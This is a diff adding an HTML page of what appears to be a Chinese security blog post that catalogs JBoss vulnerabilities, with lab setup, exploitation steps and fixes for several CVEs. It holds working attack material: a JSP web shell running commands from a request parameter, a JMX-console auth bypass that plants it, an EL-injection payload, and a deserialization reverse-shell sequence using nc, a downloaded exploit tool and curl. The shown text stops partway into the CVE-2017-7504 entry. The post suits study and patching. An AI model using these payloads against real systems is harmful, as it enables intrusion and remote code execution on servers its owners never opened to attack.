@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Jboss漏洞汇总 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Jboss漏洞汇总</h2>
+  <p class="post-date">2020-07-05</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>JBoss是一套开源的企业级 Java 中间件系统，用于实现基于 SOA 的企业应用和服务</p>
+<p>JBoss AS 开源社区版本，发布比较频繁。JBoss 7 ，先后发布了 7.0.0, 7.0.1, 7.0.2, 7.1.0, 7.1.1, 7.1.2, 7.1.3, 7.2.0，其中 7.1.1 比较经典，7.2.0 是 JBoss EAP 6.1 的基础zhi，但7.1.2, 7.1.3, 7.2.0 只是源代码打了 Tag，并没提供开放下载。</p>
+<p>JBoss EAP（Enterprise Application Platform） 在开源版本上构建的企业版本，目前Redhat 已经将 JBoss EAP 放在 JBoss.org 开放下载，开发人无需注册 Redhat （之前是必须有 Redhat.com 账号才能下载 JBoss EAP）。</p>
+<p>Wildfly 是 JBoss AS 新的项目名称，从 8 开始，新的 JBoss AS 正式有一个名字，叫 WildFly， 目前已经发布 8 Beta 版本，针对开发人员的 Java EE 7 功能已经完全实现。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="jdk安装"><a href="#jdk安装" class="headerlink" title="jdk安装"></a>jdk安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200629230736581.png" alt="image-20200629230736581"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> mkdir /usr/java</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp jdk-6u32-linux-x64-rpm.bin /usr/java/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chmod +x jdk-6u32-linux-x64-rpm.bin</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ./jdk-6u32-linux-x64-rpm.bin</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">default                     latest                                 sun-javadb-demo-10.6.2-1.1.i386.rpm</span><br><span class="line">jdk1.6.0_32                 sun-javadb-client-10.6.2-1.1.i386.rpm  sun-javadb-docs-10.6.2-1.1.i386.rpm</span><br><span class="line">jdk-6u32-linux-amd64.rpm    sun-javadb-common-10.6.2-1.1.i386.rpm  sun-javadb-javadoc-10.6.2-1.1.i386.rpm</span><br><span class="line">jdk-6u32-linux-x64-rpm.bin  sun-javadb-core-10.6.2-1.1.i386.rpm</span><br><span class="line"><span class="meta">#</span><span class="bash"> vi /etc/profile</span></span><br><span class="line">export JAVA_HOME=/usr/java/jdk1.6.0_32</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">source</span> /etc/profile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> java -version</span></span><br><span class="line">java version &quot;1.6.0_32&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.6.0_32-b05)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 20.7-b02, mixed mode)</span><br><span class="line">OK</span><br><span class="line">//也可以使用yum进行安装jdk</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum -y list java*			//会列出所有jdk版本信息</span></span><br><span class="line">//安装指定jdk</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum -y install java-1.7.0-openjdk*</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> java -version</span></span><br><span class="line">java version &quot;1.7.0_261&quot;</span><br><span class="line">OpenJDK Runtime Environment (rhel-2.6.22.2.el7_8-x86_64 u261-b02)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)</span><br></pre></td></tr></table></figure>
+
+<h4 id="JBoss版本"><a href="#JBoss版本" class="headerlink" title="JBoss版本"></a>JBoss版本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//JBoss全版本下载</span><br><span class="line">https://jbossas.jboss.org/downloads</span><br><span class="line">https://teddysun.com/260.html</span><br><span class="line">//6.0版本</span><br><span class="line">https://sourceforge.net/projects/jboss/files/JBoss/JBoss-6.0.0.Final/</span><br><span class="line">//4.2.3版本</span><br><span class="line">http://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA.zip/download</span><br></pre></td></tr></table></figure>
+
+<p>版本6.0</p>
+<p>JBoss-6.0.0.Final</p>
+<p><img src="/images/Jboss/image-20200629174602625.png" alt="image-20200629174602625"></p>
+<h4 id="JBoss安装"><a href="#JBoss安装" class="headerlink" title="JBoss安装"></a>JBoss安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> unzip jboss-as-distribution-6.0.0.Final.zip</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ll</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 版本替换须重启系统，以免无法访问最新替换系统。或启动run时报错。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/profile</span></span><br><span class="line">export JBOSS_HOME=/usr/local/jboss-6.0.0.Final/</span><br><span class="line">export PATH=$PATH:$JBOSS_HOME/bin</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">source</span> /etc/profile</span></span><br><span class="line">//启动</span><br><span class="line"><span class="meta">#</span><span class="bash"> ./run.sh -b 0.0.0.0</span></span><br><span class="line">//curl请求尝试</span><br><span class="line"><span class="meta">#</span><span class="bash"> curl -I http://127.0.0.1:8080/</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache-Coyote/1.1</span><br><span class="line">X-Powered-By: Servlet/3.0; JBossAS-6</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">ETag: W/&quot;1554-1293496144000&quot;</span><br><span class="line">Last-Modified: Tue, 28 Dec 2010 00:29:04 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1554</span><br><span class="line">Date: Tue, 30 Jun 2020 12:22:53 GMT</span><br><span class="line">//关闭本地防火墙防止无法访问</span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl stop firewalld.service</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630134941050.png" alt="image-20200630134941050"></p>
+<h4 id="JavaDeserH2HC"><a href="#JavaDeserH2HC" class="headerlink" title="JavaDeserH2HC"></a>JavaDeserH2HC</h4><p>此工具主要用于检测和测试反序列化类漏洞，项目地址已经贴到下面。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a></p>
+<h3 id="漏洞分类实战"><a href="#漏洞分类实战" class="headerlink" title="漏洞分类实战"></a>漏洞分类实战</h3><h4 id="CVE-2006-5750"><a href="#CVE-2006-5750" class="headerlink" title="CVE-2006-5750"></a>CVE-2006-5750</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>CVE-2007-1036漏洞相同，CVE-2006-5750漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。</p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、参考CVE-2010-0738漏洞</p>
+<h4 id="CVE-2007-1036"><a href="#CVE-2007-1036" class="headerlink" title="CVE-2007-1036"></a>CVE-2007-1036</h4><p>JMX Console HtmlAdaptor Getshell</p>
+<h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>由于JBoss对 /jmx-console/HtmlAdaptor 路径未做任何认证措施，导致这个服务完全对外开放，可直接访问控制台部署shell。</p>
+<h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>全版本</p>
+<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>
+<h5 id="漏洞实战"><a href="#漏洞实战" class="headerlink" title="漏洞实战"></a>漏洞实战</h5><p>1、URL访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.144.135:8080/jmx-console/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630141919387.png" alt="image-20200630141919387"></p>
+<p>2、创建war包木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  jsp jar -cvf muma.war shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>3、部署远程木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">部署远程war必须确保war提供web能够访问否则怎么叫远程部署呢？</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630143911494.png" alt="image-20200630143911494"></p>
+<p><img src="/images/Jboss/image-20200630143935231.png" alt="image-20200630143935231"></p>
+<center>部署完成结果</center>
+4、访问木马
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.144.135:8080/muma/shell.jsp</span><br><span class="line">//如出现500即为部署成功只是无法解析</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630144229517.png" alt="image-20200630144229517"></p>
+<p>5、管理工具连接</p>
+<p><img src="/images/Jboss/image-20200630144201038.png" alt="image-20200630144201038"></p>
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>因jboss默认未设置密码，导致jmx-console可远程部署war并导致被攻击。</p>
+<p>1、开启安全配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//注释去掉(6.x版本修改下面文件)</span><br><span class="line">/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml</span><br><span class="line">//4.x版本修改下面文件</span><br><span class="line">/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630145646406.png" alt="image-20200630145646406"></p>
+<p>2、web.xml配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630145856647.png" alt="image-20200630145856647"></p>
+<p>3、设置账号及密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//修改账号及密码（默认是admin/admin）</span><br><span class="line">server/default/conf/props/jmx-console-users.properties</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630150052719.png" alt="image-20200630150052719"></p>
+<p>4、访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//修改以上配置后记得重启Jboss</span><br><span class="line">//直接停止run.sh</span><br><span class="line">//进程查看</span><br><span class="line"><span class="meta">#</span><span class="bash"> ps aux | grep jboss</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span> -9 PID</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200630150711860.png" alt="image-20200630150711860"></p>
+<h4 id="CVE-2010-0738"><a href="#CVE-2010-0738" class="headerlink" title="CVE-2010-0738"></a>CVE-2010-0738</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>JBoss默认仅对“GET”和“POST”方法启用安全限制。</p>
+<p>使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证，直接调用jmx-console实现的任何功能。</p>
+<p>注意：如果JMX控制台回复HTTP 500错误，则表示请求已正确处理。</p>
+<h5 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h5><p>JBossAS &lt; 4.3</p>
+<h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>JBoss默认仅对“GET”和“POST”方法启用安全限制；使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jboss-4.2.3.GA/server/default/deploy/jmx-console.war/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200701103827156.png" alt="image-20200701103827156"></p>
+<h5 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL请求</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.144.139:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200701142719465.png" alt="image-20200701142719465"></p>
+<p>2、参数对应值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 路径</span></span><br><span class="line">shell.war</span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件名</span></span><br><span class="line">shell</span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件后缀</span></span><br><span class="line">.jsp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件内容</span></span><br><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如POST提交需认证，修改请求方法未HEAD并复制POST数据至URL处</span></span><br><span class="line">action=invokeOp&amp;name=jboss.admin:service=DeploymentFileRepository&amp;methodIndex=6&amp;arg0=../jmx-console.war/&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;&amp;arg4=True</span><br><span class="line"><span class="meta">#</span><span class="bash"> 访问(获取当前目录文件夹及文件)</span></span><br><span class="line">http://172.16.144.139:8080/jmx-console/shell.jsp?i=touch%201.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200701153249170.png" alt="image-20200701153249170"></p>
+<p><img src="/images/Jboss/image-20200701152708158.png" alt="image-20200701152708158"></p>
+<p>3、shell新建文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.144.139:8080/shell/shell.jsp?i=touch%201.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200701152747850.png" alt="image-20200701152747850"></p>
+<p><img src="/images/Jboss/image-20200701152836122.png" alt="image-20200701152836122"></p>
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、升级最新版本</p>
+<p>2、设置登录认证(参考CVE-2007-1036修复)</p>
+<h4 id="CVE-2010-1871"><a href="#CVE-2010-1871" class="headerlink" title="CVE-2010-1871"></a>CVE-2010-1871</h4><h5 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p><code>JBossSeam</code>是一个<code>JavaEE5</code>框架，把JSF与<code>EJB3.0</code>组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。</p>
+<p><code>JBossSeam</code>处理某些参数化<code>JBossEL</code>表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的<code>JBossSeam</code>用户访问特制的网页，就可能导致执行任意代码。</p>
+<h5 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h5><p>JBoss AS = 4.3.0（4.3.0属于企业版，导致部分环境没法搭建复现）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//4.3.0等版本下载</span><br><span class="line">http://ftp.riken.jp/Linux/redhat/ftp.redhat.com/jboss/eap/4.3.0/en/source/</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>漏洞是通过<code>seam</code>组件中插入<code>#&#123;payload&#125;</code>进行模板注入，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法），从而可以传入任何想要执行的命令。</p>
+<h5 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、漏洞位置描述</p>
+<p>漏洞是通过seam组件中插入#{payload}进行模板注入，可以在以下链接中插入要执行的方法，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法）,从而可以传入任何想要执行的命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23&#123;&#125;的#&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、PoC</p>
+<p>cmd代表传入的远程命令。在<code>/admin-console/login.seam</code>路径下，POST传入构造好的<code>payload</code>，即可对此漏洞利用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actionOutcome=/success.xhtml?user%<span class="number">3d</span>%<span class="number">23</span>&#123;expressions.getClass().forName(<span class="string">&#x27;Java.lang.Runtime&#x27;</span>).getDeclaredMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(expressions.getClass().forName(<span class="string">&#x27;Java.lang.Runtime&#x27;</span>)).exec(cmd)&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、补丁修复</p>
+<h4 id="CVE-2013-4810"><a href="#CVE-2013-4810" class="headerlink" title="CVE-2013-4810"></a>CVE-2013-4810</h4><h5 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>此漏洞和<code>CVE-2015-7501</code>漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中<code>JMXInvokerServlet</code>和<code>EJBInvokerServlet</code>利用的是<code>org.jboss.invocation.MarshalledValue</code>进行的反序列化操作，</p>
+<p>而<code>web-console/Invoker</code>利用的是<code>org.jboss.console.remote.RemoteMBeanInvocation</code>进行反序列化并上传构造好文件。</p>
+<h5 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h5><p>JBoss AS 6.X</p>
+<h5 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><h5 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、参考CVE-2015-7501</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;漏洞路径</span><br><span class="line">&#x2F;invoker&#x2F;EJBInvokerServlet</span><br><span class="line">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;invoker&#x2F;EJBInvokerServlet</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200702153308520.png" alt="image-20200702153308520"></p>
+<p>2、反弹shell</p>
+<p>直接参考CVE-2015-7501</p>
+<h5 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、<a target="_blank" rel="noopener" href="https://access.redhat.com/security/cve/cve-2015-7501">补丁</a></p>
+<h4 id="CVE-2015-7501"><a href="#CVE-2015-7501" class="headerlink" title="CVE-2015-7501"></a>CVE-2015-7501</h4><h5 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的<code>jmx</code>组件⽀持Java反序列化导致产生漏洞。</p>
+<h5 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h5><p>JBoss AS 6.x</p>
+<h5 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放</p>
+<h5 id="漏洞检测-4"><a href="#漏洞检测-4" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、PoC</p>
+<p>浏览器直接访问域名，如出现下载文档即可确定存在漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.144.156:8080&#x2F;invoker&#x2F;JMXInvokerServlet</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200702122358123.png" alt="image-20200702122358123"></p>
+<p>2、反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nc -lvnp 5555(攻击主机执行监听)</span></span><br><span class="line">//攻击主机目录下下载</span><br><span class="line"><span class="meta">#</span><span class="bash"> wget http://scan.javasec.cn/java/JavaDeserH2HC.zip</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> unzip JavaDeserH2HC.zip</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:5555				(攻击主机及端口号)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> curl http://172.16.144.157:8080/invoker/<span class="built_in">readonly</span> --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Jboss/image-20200702134459047.png" alt="image-20200702134459047"></p>
+<h5 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、<a target="_blank" rel="noopener" href="https://access.redhat.com/security/cve/cve-2015-7501">补丁</a></p>
+<h4 id="CVE-2017-7504"><a href="#CVE-2017-7504" class="headerlink" title="CVE-2017-7504"></a>CVE-2017-7504</h4><h5 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的<code>JMS over HTTP Invocation Layer</code>的<br>HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤<br>该漏洞执⾏任意代码。</p>
+<h5 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h5><p>JBoss AS 4.x之前版本</p>
